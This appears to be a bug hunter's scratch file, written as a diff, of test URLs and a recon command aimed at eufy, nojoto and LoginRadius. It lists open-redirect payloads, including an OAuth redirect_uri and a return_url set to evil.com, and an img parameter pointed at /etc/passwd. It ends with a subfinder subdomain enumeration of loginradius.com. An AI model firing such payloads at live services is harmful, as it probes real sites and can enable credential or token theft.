@@ -1,0 +1,22 @@
+https://us.eufy.com/pages/series?series=iPath%20Laser%20Navigation%20Series&tag=accessory_T2275&title=RoboVac%20L50%20SES&img=https://cdn.shopify.com/s/files/1/0504/7094/4954/files/L50_SES.png?v=1699501176&discontinued=1
+
+
+https://upload.wikimedia.org/wikipedia/commons/b/bc/Alan_Walker_%28cropped%29.jpg
+
+https://us.eufy.com/pages/series?series=iPath%20Laser%20Navigation%20Series&tag=accessory_T2275&title=RoboVac%20L50%20SES&img=/etc/passwd?v=1699501176&discontinued=1 
+
+=============================================================================================================
+https://nojoto.com/under-maintenance.php?return=https://nojoto.com/nojoto-for-creator.php
+https://nojoto.com/under-maintenance.php?return=https://upload.wikimedia.org/wikipedia/commons/b/bc/Alan_Walker_%28cropped%29.jpg
+
+=======================================================
+https://nojoto.com/referral/warfadehcker3895/?placement=Referral%20Screen&pid=invite&medium=Whatsapp&shortlink=f9duqcqb&af_referrer_customer_id=9607633f50fbac0cfe582e01f1699ad0&deep_link_value=https%3A%2F%2Fnojoto.com%2Freferral%2Fwarfadehcker3895%2F&af_channel=Referral_Invite&af_siteid=com.nojoto.cinco&format=Image_share&af_referrer_uid=1665027403560-485637913758600130
+
+https://nojoto.com/referral/warfadehcker3895/?placement=Referral%20Screen&pid=invite&medium=Whatsapp&shortlink=f9duqcqb&af_referrer_customer_id=9607633f50fbac0cfe582e01f1699ad0&deep_link_value=https://upload.wikimedia.org/wikipedia/commons/b/bc/Alan_Walker_%28cropped%29.jpg%2F&af_channel=Referral_Invite&af_siteid=com.nojoto.cinco&format=Image_share&af_referrer_uid=1665027403560-485637913758600130
+
+https://accounts.loginradius.com/auth.aspx?return_url=https://evil.com
+
+https://cloud-api.loginradius.com/sso/oauth/redirect?client_id=c9cc7809-4735-41c6-995e-aca23e148454&redirect_uri=evil.com
+
+
+subfinder -d  loginradius.com -recursive -t 500 -all -config .config/subfinder/provider-config.yaml -silent | anew all_domain.txt [FTL] Could not read config: yaml: line 1: did not find expected key
